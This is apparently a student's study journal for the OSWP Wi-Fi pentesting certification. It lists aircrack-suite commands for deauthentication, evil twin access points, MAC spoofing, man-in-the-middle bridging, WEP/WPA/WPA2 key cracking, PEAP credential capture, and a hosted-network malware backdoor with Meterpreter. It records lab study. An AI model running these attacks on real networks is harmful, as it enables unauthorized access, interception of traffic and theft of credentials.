# Pentester wifi pentest journal

Progress I have learnt for OSWP through pentester academy wifi megaprimer.

## 1) Wifi basics :
* ifconfig -a
* lsmod
* ifconfig wlan0 up (leoxsys/alfa king)
* airmon-ng
* airmon-ng start wlan0
* ifconfig/iwconfig

## 2) Bands channels and surfing
* wireshark & (capture wireshark interface in wlan0mon)
* iwconfig wlan0 channel 1
* airodump-ng --band bg wlan0mon

## 3) Pwning beacon frames :
* mdk3 --help
* mdk3 wlan0mon b -n Pwned

## 4) Dissecting AP-Client connections :
* airodump-ng wlan0mon (check which channel it is )
* iwconfig wlan0mon channel 1
* wireshark & (wlan addr === ((access mac)) && not selected beacon frames )
* connect wifi through a phone
* wireshark & (wlan addr === ((access mac)) && wlan addr === ((client mac)) )
  * probe req packets 1 ) broadcast packets(identifying) 2 ) client queries for a specific access point
  * Auth request and auth response
  * association request and association response.
  * ARP response
  * data transfer

## 5) WLAN Headers :
Check the separate WLAN headers page for theory part.

## 6) Pwning Hidden SSIDs :

#### Hidden SSID : // Hardly a challenge for experienced wireless hacker
* Turn ssid broadcasting OFF in beacon frames
* just monitoring beacon frames will not give you the ssid
* A "security through obscurity"technieuq at best
* Can only deter novices

(set the visibility status in the router page for hidden ssid)

#### Multiple techniques
* Monitor air for a new client trying to associate with the access point (passive)
* de-authenticate one or all clients and monitor reconnections ( active)

* basic idea is to force the network to send probe/association pakets
* these packets contain the ssid even if not present in the beacon frame from the access point

```
airodump-ng wlan0mon --channel 1 --bssid (mac of the router)

aireplay-ng --deauth 0 -a (bssid mac) wlan0mon
```
check for the flow of deauth,probe,association and auth packets in wireshark


## 7) Laughing off MAC Filters :

* MAC address are visible in plain sight. (Enable mac filter in  router in advanced section)
```
aireplay-ng --fakeauth 10 -e <ESSID> wlan0mon
```
Authentication fails due to mac filtering.
spoof the mac address :
```
aireplay-ng --fakeauth 10 -e <ESSID> -h <mac address> wlan0mon
```
Conclusion : MAC filtering is useless scheme. There's no defense at all. Even in an airport/restaurants which SSO login, we can clone anyone's MAC and use wifi.

## 8) Hacking WLAN Authentication :
* Open and shared authentication.
* No actual authentication.
* WEP uses rc4

```
airodump-ng --channel 1 wlan0mon --bssid <bssid> --write demo
```
Auth key has no value. When connected a device to access point, it will decide if its open or shared key.

```
airodump-ng --channel 1 wlan0mon --bssid <bssid> --write fakeauth

aireplay-ng --fakeauth 10 wlan0mon -e <essid> -y demo  // (demo is a sample keystream xor file)
```
## 9) Hotspot attacks :

Hotspot basic:
 * open authentication.
 * MAC filtering at times
 * No encryption - distribution of keys would be a nightmare
 * Can use captive portals for application layer authentication

create am evil twin in the vicinity
 * Same essid
 * Same bssid ( optional )

Use de-authentication attacks to break client AP connection. If evil twin has higher signal strength, then client will connect to it.

Attack visualization :
1) Metasploit
2) MITM to client

Change channel :
```
iwconfig wlan0mon channel 11
```
Create access on channel 11 :
```
airbase-ng -a AA:AA:AA:AA:AA:AA -e <ESSID> wlan0mon //ESSID = SecurityTube
```
Created tap0 interface // wired interface
```
ifconfig at0 up

aireplay-ng --deauth 0 -a <bssid> wlan0mon
```
Change channel if its using multiple channel
```
iwconfig wlan0mon channel 1
```
Airbase and Aireplay at same point.

Client sends gratuitous arp to check for dhcp in fake AP.
```
ifconfig at0 169.254.174.226 netmask 255.255.255.0 up

ping 169.254.174.227
```
IP level connection is established. 

## 10) Hacking isolated clients :

* Multiple cases possible :
 Access point stored in the PNL or similar could have either of 3 configurations :
 	* No encyrption
   	* WEP
	* WPA/WPA2

Case 1 : open auth, no encryption
```
airbase-ng --essid <essid> -a AA:AA:AA:AA:AA:AA wlan0mon
```
-v for verbose
wireshark the packets :
#### wlan.addr == (bssid) && wlan.addr == AA:AA:AA:AA:AA:AA 

Client will try for DHCP. So check for at0 interface.
```
airbase-ng -P -C 10 -a AA:AA:AA:AA:AA:AA wlan0mon -v
```
Check the client device. Your client device will be hopping all connections which is weird because it is confused by the ESSID. Reasons ?
 * Client cannot authenticate the access point
 * SSID all alone is used to decide whom to connect to
 * Anyone can set a similar ssid and force a client to connect to their access point
 * This is especially true with hotspot ssids as they by definition are open authentication with no encryption.

## 11) ALFA card king-fu :
Check the separate ALFA-card kung-fu page for theory part.

## 12) Man-in-the-middle-attacks :

#### Bring in both the ethernet and airbase interfaces :
```
ifconfig
ifconfig eth0 up

airbase-ng --essid <ESSID> wlan0mon

ifconfig at0 up
```

#### Bridge both the interfaces :
```
brctl addbr mitm

brctl show
```
No interface will be there. 
#### Add an interface :
```
brctl addif mitm at0

brctl addif mitm eth0

ifconfig eth0 0.0.0.0 up
ifconfig at0 0.0.0.0 up

ifconfig mitm up
```
#### Assign an ip address to mitm inteface :
```
dhclient3 mitm &

ifconfig mitm
```
An ip address is already allocated over dhcp.
Now connect a client to your wifi. You have access of viewing the victim data but victim has no idea of the MITM.

## 13) SSL-Man-in-the-middle-attacks :
We can use DNS spoofing for ssl mitm.
First bridge interface mitm through at0 and eth0.
```
dnsspoof -i mitm
```
Open burp and add ports 80 and 443 and add invisible proxy option.
Intercept off and forward all requests. Notice the dnsspoof.

Try gmail. browser couldnt verify server identity.

## 14) WEP in depth :
Check the separate WEP in detail page for theory part.

## 15) WEP Cracking :
ARP Request packet is broadcast packet and ARP Response is an unicast packet.

How does the Attacker identify the ARP Packets ? Aren't they all encrypted ? ARP Packets are of a fixed unique size, easy to identify even if encrypted.

1) Capture ARP Request packets using encrypted packet size back.
2) Replay them blindly, and see if the network responds back.
3) If Yes, then we found ourselves winner.
```
airodump-ng --channel 1 wlan0mon

airodump-ng --channel 1 wlan0mon --write OnlineCracking --bssid <victim>
```
Connect the client to the victim access point.

Detect and replay the attack:
```
aireplay-ng --arpreplay -e <essid> wlan0mon
```
0 arp requests found. 

First deauth the client:
```
aireplay-ng --deauth 0 -e <essid> wlan0mon
```
Data packets will generate.
```
aireplay-ng --deauth 0 -e <essid> -h <mac of essid> wlan0mon
```
Now aireplay and deauth :
```
aireplay-ng --deauth 0 -e <essid> wlan0mon
```
Now it will send tons of packets which will get accepted by access point.

But data will not increase. Need to specify the mac for arpreplay for client mac.

```
aireplay-ng --arpreplay -e <essid> -h <clientmac> wlan0mon
```

Now start aircrack
```
aircrack-ng OnlineCracking-01.cap
```
The AB(12343) , AB is the possible byte and the numbers of vote for possible match by IVs.

The key gets cracked in a few minutes.

## 16) Cafee-latte attack basics :
Check the separate caffe-latte basics page for theory part.

## 17) Cafee-latte attack demo :

* Details:
	* Once the client connects to the fake AP it will send out DHCP requests
	* DHCP will time out eventually(Caffe-latte works in static as well)
	* Auto-configuration IP address will kick in
	* Client will send a gratuitous ARP packet

* Create a fake AP :

```
airbase-ng -c 1 --essid <essid> wlan0mon -W 1
```

In wireshark, we can see DHCP packets.

If we monitor for Logical-Link control - > type : arp,
we can see gratuitious arp packets. If we had not enabled decryption, we wont see anything.
```
airbase-ng -c 1 --essid <essid> wlan0mon -W 1 -L -x 10
```
To store the packets :
```
airodump-ng --channel 1 -e <essid> wlan0mon --write CaffeLatte-Demo

// or

airodump-ng --channel 1 wlan0mon --write CaffeLatte-Demo 
```
(since only 1 acccess point is there)
(can use -b for the bssid)

Once we see the arp requests, we can check the arp responses.
Filter out requests and check for responses.
The initialization vector in IEEE 802.11 changes in all packets.

On average, it takes 6 minutes to crack the WEP key.

Note : Use base machine instead of VM so not to hang VM due to huge I/O over the USB.

## 18) Koreks chop-chop attack :

This also works in message modification vulnerability

Encrypted data is chopped into several pieces for the encrypted data.

1) First the last byte is chopped off from the encrypted data near the encrypted ICV
2) So the new byte is one byte shorter since Korek does not know the plain text value of the byte to replace it in the original place.
3) Sends the packet to multicast address (AP)

Similarly a lot of guesses are done to accept the packet with new ICV :

| Guess | New-ICV | Accepted |
|-------|---------|----------|
| 00    | ICV-1	  |  No      |
| 01    | ICV-2	  |  No      |
| .     |   .	  |  .       |
| FA    | ICV-n	  |  Yes !   |

So 1 byte of the packet is decrypted.

#### End result:
* Decrypt entire WEP Packet byte by byte
* Can be orchestrated in 2 modes: 
	* Some APs send a de-authentication packet if the WEP Packet is valid but MAC is not associated
	* May not work always.

```
aireplay-ng --chopchop -e <essid> wlan0mon
```
Wireshark the bssid of the essid and remove beacon frames

Once the aireplay is stopped, it will ask for use the packet.

press 'y'. Decryption process will start.

Plain text packet is saved in cap file.

Wireshark the packet :
```
wireshark <packet.cap>
```
This is the procedure to decrypt a packet without a decrption key using chopchop attack.

## 19) Fragmentation and Hirte attack :
#### Understanding fragmentation :
There will be a very large frame to transfer over wireless. So we need to break the frame into fragments.
Sequence control in the IEEE 802.11 is broken into fragment number and sequence number.
There is also one more bit from frame control field called "more fragments"
This fragment will be set to 1.

* Details :
	* LLC header is known.
	* Size of the LLC header is 8 bytes.
	* The only unknown thing is Ether type.
	* Size of the LLC can determine ARP or IP. Can be guessed by type.

#### Packet Breakup :

Encrypted Data			Enc ICV  
XOR  
LLC 	8 bytes  
||  
RC4 Keystream  
  
What do we have ?  
RC4 Key stream |  8 bytes of keystream + corresponding IV  
  
Data 	ICV  
4	4  
  
||  
VV  
  
XOR		---> Encrypted data    ICV  
  
^^  
||  
RC4 Keystream  
(8 bytes)  
  
Fragmentation to the rescue

4	4	4  
  
Data 	To be	Sent  
	|  
	|--------------------------------------------------------  
	|------------------------------|------------------------|  
Encrypted Data 1  ICV-1 	Encrypted Data2 ICV-2	Encrypted Data 3  ICV-3  
  

	* Up to 16 fragments can be sent
	* Each can carry 4 bytes of data
	* Total 64 bytes can be injected

* Hirte attack:
	* Uses  key concepts from the caffe latte attack and fragmentation attack
	* Targets an isolated client, allows association, waits for an ARP packet like the caffe latte
	* Converts that into an ARP request for the same client by relocating the IP address in the ARP header using fragmentation and patches using Message modification flaw
	* Client accepts packet and sends replies
	* GAME OVER!
```
airbase-ng -c 1 --essid <essid> -W 1 wlan0mon -N 
```
(-N for hirte attack)
```
airodump-ng --channel 1 wlan0mon --write Hirte
```
The data packets will start pumping rapidly.
```
aircrack-ng Hirte-01.cap
```

## 20) Understanding WPA/ WPA2 Attacks :
Check the wpa-wpa2 understanding page for theory part.


## 21) WPA PSK :
Check the wpa-wpa2 understanding page and look for the WPA extended understanding the for theory part.

## 22) WPA PSK cracking :

Most possible way is WPA-PSK Dictionary attack in aircrack-ng method and cowpatty method.

#### Aircrack-ng method :
```
airodump-ng wlan0mon --channel 1

airodump-ng wlan0mon --channel 1 --write dlink-psk (Just a name)

aircrack-ng dlink-psk-01.cap
```
It requires a dictionary file. Creating a dummy dictionary file :
```
echo qwertyui > dict

aircrack-ng dlink-psk-01.cap -w dict
```
Passphrase not in dictionary. Append the actual password :
```
echo securitytube >> dict

aircrack-ng dlink-psk-01.cap -w dict
```

#### Cowpatty method:
```
cowpatty -f dict -r dlink-psk-01.cap -s dlink
```
Which packet do we need in the handshake ?  
* All packets have the AP MAC and client MAC
* ANonce
	* Packet 1 and Packet 3
* SNonce
	* Packet 2

Answer : (Either All 4 packets), or (Packets 1 and 2) or (packet 2 and 3)

#### Decrypting WPA-PSK Traces :
* Using Wireshark
* Airedecap-ng :
```
airdecap-ng -e dlink -p securitytube dlink-psk-01.cap

wireshark dlink-psk-01-dec.cap
```
Note : airdecap is not correct always as it fails to decrypt wpa.  
Can use like :
```
airdecap-ng -e dlink -p securitytube demo232-01.cap -b (mac of client)

wireshark demo232-01-dec.cap &
```
Now we are able to decrypt all the packets.

PS : Airedecap has a small bug in this.

## 23) WPA-2 PSK cracking :

* same principles apply
* As vulnerable as wpa-psk is if a weak passphrase is chosen.

#### Setting :
* Security Mode : WPA-Personal  
* WPA Mode : WPA 2 Only  
* Cipher Type : AES  
* Group Key Update Interval :3600 seconds  

```
airodump-ng --channel 1 wlan0mon
```
Cipher suite is CCMP, which inside uses AES.
```
airodump-ng --channel 1 wlan0mon --write wpa2-psk
```
Connect the client and connect wireshark with the packet.
```
wireshark wpa2-psk-01.cap &
```
Search for eapol packets.

Look at the replay counter :  
* First and second packets should have same.
* First and third have same Nonce.
* Second and fourth have same Nonce.

In the key information in 802.11x, it will say 010 which is HMAC-SHA1 for MIC and AES encryption.

Now cracking :
```
aircrack-ng wpa2-psk-01.cap
```
Index number target. Check target (ex : 2 for dlink) 
```
aircrack-ng wpa2-psk-01.cap -w dict
```
Key will be cracked.

Cowpatty method will acquire the same. 

airdecap to decrypt :
```
airdecap-ng -e dlink -p securitytube wpa2-psk-01.cap -b (bssid)
```

## 24) Speeding up WPA_WPA-2 PSK cracking :

#### PBKDF2:
* Requires SSID
	* List of commonly used SSIDS

* Requires Passphrase
	* Can be provided form a dictionary

PMK can be pre-computed using the above.

#### Other parameters in key cracking :

* Snonce, Anonce, Supplicant MAC, Authenticator MAC varies and hence cannot be "pre-calculated"
* PTK will be different based on the above.
* MIC will be different as well
Thus these cannot be pre-calculated in the above.

#### Speed up cracking :

Preshared key 256 bit (PMK)------------------> 4 way handshake------------------> ptk-----------> verify by checking  
^  
|..............................................................................................Snonce  
|..............................................................................................Anonce  
|..............................................................................................AP Mac  
|..............................................................................................Client MAC  
|  
|  
Pre calculated list of PMK for a  
1.Given SSID  
2.Dictionary of passphrased  

* Platforms to fasten cracking : 
	* Multicores
	* ATI-Stream
	* Nvidia CUDA
	* In the cloud - Amazon EC2

#### Fast Cracking Demo : Pyrit, genpmk, cowpatty etc
P.S : Extensive hardware which is costly are required to fasten the process.

aircrack-ng is the usual method.

We can use other methods :
```
genpmk -f dict -s dlink -d Pre-Computed-PMKS //(output filename)

cat Pre-Computed-PMKS

cowpatty -d Pre-Computed-PMKs -s dlink -r wpa2-psk-01.cap

pyrit -r wpa2-psk-01.cap analyze

pyrit -r wpa2-psk-01.cap -i Pre-Computed-PMKs attack_cowpatty
```

airolib-ng can be used :
```
airolib-ng PMK-Airolib --import cowpatty Pre-Computed-PMKs

ls PMK-Airolib

sqlite3 PMK-Airolib

.tables

select * from pmk;
select * from essid;
select * from passwd;
.quit
```

aircrack-ng can be used to call airolib :
```
aircrack-ng -r PMK-Airolib wpa2-psk-01.cap
```
Select the network ? For ex : 2

Password is cracked.

## 25) Mood swings of wandering client :

#### Stories of a wandering client :

* Multiple profiles stored :
	* open
	* wep
	* wpa/wpa2

Tools dont work properly (wifish finder etc). But lets crack this from the basic principle.

* Exploit all possibilities
	* Need SSID with multiple configurations
	* We need to find the security settings first
	* We will fight the battle later

```
airmon-ng start wlan0

airodump-ng wlan0mon
```
Create multiple monitor modes using the same command.

Also create different access points:
```
airbase-ng --essid dlink -a aa:aa:aa:aa:aa:aa -c 1 wlan0mon1

airbase-ng --essid dlink -a bb:bb:bb:bb:bb:bb -c 1 -W 1 wlan0mon2

airbase-ng --essid dlink -a cc:cc:cc:cc:cc:cc -z 2 -W 1 wlan0mon3 
(-z is to set security level to 2 wpa-psk)

airbase-ng --essid dlink -a dd:dd:dd:dd:dd:dd -c 1 -W 1 -Z 4 wlan0mon4
(-z 4 is wpa2-psk)

airodump-ng wlan0mon --channel 1 --write honeypot
```
Wireshark the packets using the wlan.addr as the source bssid.

## 26) Cracking wpa2 with just a client :

#### Stimulating a handshake :
A hacker instead of AP and he doesnt have a PSK and has Anounce.
Client which has the PSK dervied from passphrase, derives from SNounce and sends with MIC to dictionary attack.
```
airodump-ng --channel 1 wlan0mon

airbase-ng --essid "(essid)" -a aa:aa:aa:aa:aa:aa -c 1 wlan0mon1
airbase-ng --essid "(essid)" -a bb:bb:bb:bb:bb:bb -c 1 -W 1 wlan0mon2
airbase-ng --essid "(essid)" -a cc:cc:cc:cc:cc:cc -c 1 -W 1 -Z 2 wlan0mon3
airbase-ng --essid "(essid)" -a dd:dd:dd:dd:dd:dd -c 1 -W 1 -Z 4 wlan0mon4

airodump-ng wlan0mon --channel 1 --write DemoWPAClient

aircrack-ng -w /pentest/passwords/worldlists/bt4-password.txt DemoWPAClient.-01.cap
```
Choose target ? 3

aircrack will be cracked.


## 27) Debugging questions :
N/A : Will be just about the previous tutorials.

## 28) WPA Supplicant :
WPA_Supplicant is the de-facto tool. Supports tons of options. Allows for better understanding of process and is open source.
* Cross platform :
	* Linux
	* Windows
	* OS X
	
* Supported EAP methods:
	* EAP-TLS
	* EAP-PEAP 
	* etc...

* Configuration file required:
	* Samples available on the tool website
	* Best idea is to use available templates and customize.

Download a sample configuration for WPA. Change the passphrase in the configuration file.
```
wpa_supplicant -Dwext -iwlan0 -c wpa-psk.conf

The connection will be correct if the passphrase is true.

wpa_supplicant -Dwext -iwlan0 -c wpa-psk.conf -dd -K -t
```
-dd for debugging
-K for showing keys
-t for show delays

To check for a DHCP connection:
```
dhclient3 wlan0

ping 192.168.0.1
```

## 29) Setting up freeradius wpe :
* WPA-Enterprise :
	* Use a RADIUS server for authentication
	* Different supported EAP Types - EAP-MD5, PEAP, EAP-TLS etc
	* De facto server - free radius : www.freeradius.org
	* Depending on EAP type used Client and Server will need to be configured.

* FreeRadius-WPE
	* FreeRadius Wireless Pwnage Edition
	* Created by Joshua and Brad. Comes along kali with a small fix

* Network architecture :
FreeRadius-WPE is installed in a Kali VM and is connected to VM.
Add an interface in VM and change bridge interface in your VM.

Here eth0 is used for internet and eth1 is used for physical access point.
```
ifconfig eth1 down
ping google.com
dhclient3 eth0

ping google.com

radiusd -s -X ( WONT WORK INITIALLY)

apt-get install libssl-dev

cd /pentest/libs/freeradius-wpe

.configure && make && make install
```
In the meantime, check now for eth1 :
```
ifconfig eth1 up

dhclient3 eth1

ping 192.168.0.1
```
Also change the WPA-Enterprise in the dlink page and then follow the certs installation setup :
```
cd /pentest/libs/freeradius-wpe/raddb/certs

./bootstrap

cp -r * /usr/local/etc/raddb/certs

radiusd -s -X 
(Now it works)
```
The radius server secret key is "test" here.

Now using your client, try to connect to the wireless network.
You will get a certificate download option.
Only if you know the credentials, you are able to connect to the server.

## 30) EAP-MD5 Basics and Demo :
Check the EAP basics page and look for both the theory and demo part in the same file.

## 31) Cracking MD5 with Eapmd5pass :

#### EAP-MD5
* Cannot be used for Wi-Fi as does not support key generation
* Does not support mutual authentication
* Both plaintext challenge and response goes over the air unencrypted
	* Attacker can obtain both
	* Launch a dictionary/educated bruteforce attack

#### MD5 Mathemagic
Hash = MD4 (EAP Response ID + Password + RADIUS Challenge)

* Available to attacker:
	* Hash
	* Response ID
	* Challenge

Simple equation - Keep guessing password till the Hash matches.
```
ifconfig -a
airmon-ng start wlan0
iwconfig wlan0mon channel 1
wireshark &
```
Sniff on the monitor mode and filter for 'eap' packets.

```
cd /WiFi/EAP-MD

/pentest/wireless/NetTools/eapmd5crack.py EAP-MD5-Cracking darkc0de.lst -v

The tool identifies an EAP MD5 exchange.
Do you want to crack ? Yes
```
Now in next terminal,
```
eapmd5pass -U SecurityTube -C <paste the request value from wireshark> -R (Response value) -E 102 -v -w WiFi/EAP-MD5/dict2
(give colon after each second letter like aa:aa:aa )
(102 Value can be checked from ID under EAP protocol under 802.1x from wireshark) 
```
## 32) EAP Types and PEAP Demo :
Check the EAP types and PEAP page for theory part.

## 33) Cracking PEAP :

* Understanding the Insecurity:
	* Server side certificates
	* Fake ones can be created
	* Clients may not prompt or user may accept invalid certificates

* Setup a Honeypot with FreeRadius-WPE :
	* Client connects
	* Accepts fake certificate
	* Sends authentication details ocer MSCHAPv2 in the TLS Tunnel
	* Attacker's radius server logs these details
	* Apply dictionary/reduced possibility bruteforce attack through Asleap by Joshua Wright.

Same as the freeradius-WPE architecture but we have to attach a Honey pot AP setup in your original AP in router.

After radius server is running, monitor for the freeradius log:
```
tail -f /usr/local/var/log/radius/freeradius-server-wpe.log -n 0

wireshark &

ifconfig -a

airmon-ng start wlan0

iwconfig wlan0 channel 1
```
After that connecting in the SecurityTube, you will see certificate as "Example Certificate Authority".

Monitor for EAP process.

Cracking the process : asleap tool
```
cd WiFi/PEAP/

asleap -C "paste the challenge" -R "paste the response of the challenge" -W darkc0de.lst (dictionary file)
(Check the video for challenge and response properly)
```
## 34) Cracking PEAP in windows network :

Windows PEAP Hacking :
1) Connecting to the servers
2) Validating server certificate authority

#### Demo:
* Create a windows Vista in VM
* Wifi Profile : Disable validate server certificate
		* PEAP
		* WPA-Enterprise
		* AES
```
asleap -C "Challenge" -R "Response of Challenge" -W darkc0de.lst
```

## 35) Cracking EAP-TTLS :
* Inner authentication in EAP-TTLS
	* MSCHAPv2
	* MSCHAP
	* CHAP
	* PAP
	* etc

In the airport security in OSX, connect TTLS in authentication.
```
asleap -C "Challenge" -R "Response" -W darkc0de.lst
```
In inner authentication, if you choose security like 'PAP' for example,
and then connect, it will ask for a credentials.

Because it is in PAP, in tail command, it will show clear text credentials.

## 36) Insecurity in 3rd party WIFI-utilities :

#### Insecure configuration in 3rd party utils:
* Most client cards ship with drivers + utility
* Utility typically created by card manufacturer and somtimes 
* provides more information
	* Signal strength
	* Operation mode choice

* Configuring network security with these utilities is a bad idea
	* Can lead to insecure configurations

#### Solution: Use your OS's inbuilt utility and configure it securely

* D-Link wireless connection manager :
	* Set the basic settings profile name to PEAP
	* SSID : SecurityTube
	* Security Option : WPA2

Click on Activate.

It won't work due to advanced settings. 
In the windows Wireless network settings, the validate server is switched off by default.
Even if you delete the profile, it automatically appears after sometime due to the configuration setting.

## 37) Conclusion and road ahead :
Plans on the megaprimer road ahead.

## 38) Windows Wireless Kung-fu :
See all interfaces : 
```
netsh wlan show interfaces
```

Drivers and capabilities : 
```
netsh wlan show drivers
```

Scan for available networks:
```
netsh wlan show networks
```

View existing profiles:
```
netsh wlan show profiles

netsh wlan show profiles name="SecurityTube"
```

Starting a profile:
```
netsh wlan connect name="OfficeAP"
```

Export a Profile:
```
netsh wlan export profile name="SecurityTube"
```

## 39) Cheating wireless backdoor with hosted network:
#### Creating an access point on a client device :
Linux Soft AP : Airbase-ng , HostAPD
Microsoft     : Hosted Network ( DHCP server included )

* Feature objective :
	* To allow creation of a wireless PAN
		* Share data with devices

	* Network connection sharing (ICS) with other devices on the network

#### Creating a Hosted Network:
Create a network with Key is wpa2-psk passphrase.

Note : SoftAP can be connected while HardAP is connected. (Interesting fact).
```
netsh wlan set hostednetwork mode=allow ssid="SoftAPDemo" keysoftapdemokey
```
Now start the connection :
```
netsh wlan start hostednetwork
```
#### Wi-Fi Backdoor:
* Easy for malware to create a Backdoor.
* The key could be:
	* Fixed
	* Derived based on MAC address of host, time of day etc.
* As host remains connected to authorized network, user does not notice a break in connection
* No message or prompt displayed.

#### Understanding Rogue Access Points:
- A physical AP brought by a hacker inside an office.
- No IDS,IPS,firewall logs.
- Difficult and sometimes impossible to track.

Post exploit : Karmetasploit

## 40) Malware metasploit and the hosted network:
- A malware can enable the hsoted network with a key the attacker can derive
- Bundle in meterpreter payload
- Attacker connects and has a meterpreter shell for himself.

#### Attacking phase :
Attacker is waiting for a network called WickedNetwork to run.
```
iwlist wlan0 scan | grep WickedNetwork
```
Meanwhile a mailPayload is waiting to run in some victim machine, once the payload is run :
```
cat WickedBackdoor.conf
```
get the psk network key from the conf file.
```
wpa_supplicant -Dwext -wlan0 -c WickedBackdoor.conf
```
Parallely run metasploit.

Meanwhile in terminal 2 run a dhcp client :
```
dhclient3 wlan0
```
The moment it is success in terminal 2, we get authentication in terminal 1 in wpa_supplicant.

Now in terminal 2, we will get an ip address. That's the gateway machine. Now to metasploit :
- Set that IP as RHOST.
- Now exploit.

Now we have a meterpreter session.

#### Empowering Karmetasploit:
- Problems with karmetasploit
- Victim accidently connects
- Karma Pwns but victim may notice and disconnect

* Solution using Hosted Network:
	* Victim acidently connects
	* Karma Pwns starts Meterpreter backdoor
	* Starts hosted network with known key
	* Victim notices and disconnects
	* Karma reconnects using Hosted Network
		* Meterpreter backdoor waiting for entry into the machine.
		
## 41) WIFI challenge 1:
Wifi challenge for WEP. Previously covered.

## 42) WIFI challenge 2:
Wifi challenge for WPA. Previously covered.

## 43) WIFI challenge 3:
Wifi challenge for WPA2. Previously covered.

## 44) Detecting AP Spoof Attacks:
#### AP Spoofing attacks:
- Level 1 :SSID Spoofing
- Level 2 :SSID and MAC spoofing.

#### SSID Spoofing Detection :
* Multiple MAC Addresses broadcasting the same SSID
	* Need authorized list of MAC addresses to figure out the rogue APs
	* Easy for an WIPS to detect and stop
	* Is the most common case for an attack
	* Higher Signal Strength Wins!!!
	* Difficult to detect with "regular" Wifi Client software.
```
ifconfig -a 

airmon-ng start wlan0 (for wlan0mon)
```
Create multiple monitor modes:
```
airmon-ng start wlan0 (for wlan0mon1)

airmon-ng start wlan0 (for wlan0mon2)
```
Create another AP access :
```
airmon-ng start wlan1 (for wlan1mon)
```
Now monitoring a particular ESSID named "GetReal"
```
airodump-ng wlan1mon -c 6
```
Now create more access points with same SSIDs:
```
airbase-ng --essid GetReal -c 6 -a aa:aa:aa:aa:aa:aa wlan0mon
```
Now we will have two "GetReal" AP.

Now set up another one :
```
airbase-ng --essid GetReal -a bb:bb:bb:bb:bb:bb -c 6 wlan0mon1
```

Now we will have 3. Now create another one.
```
airbase-ng --essid GetReal -c 6 wlan0mon2 -a cc:cc:cc:cc:cc:cc
```
Now 4 GetReal APs will have been present.

Now copy the original mac of GetReal and paste it in the aoe fake rogue APs.

```
airbase-ng --essid GetReal -c 6 -a E8:DE:27:3E:A2:56 wlan0mon
airbase-ng --essid GetReal -c 6 -a E8:DE:27:3E:A2:56 wlan0mon1
airbase-ng --essid GetReal -c 6 -a E8:DE:27:3E:A2:56 wlan0mon2
```

Note : Now pause the airodump using 'space' bar.

#### Recognizing the anomaly :
- The power level of rogue AP differs.
- Capability of the spoofed AP differs.
- Wireless IDS and IPS will detect the actual MAC address.

## 45) Detecting AP MAC Spoofing:




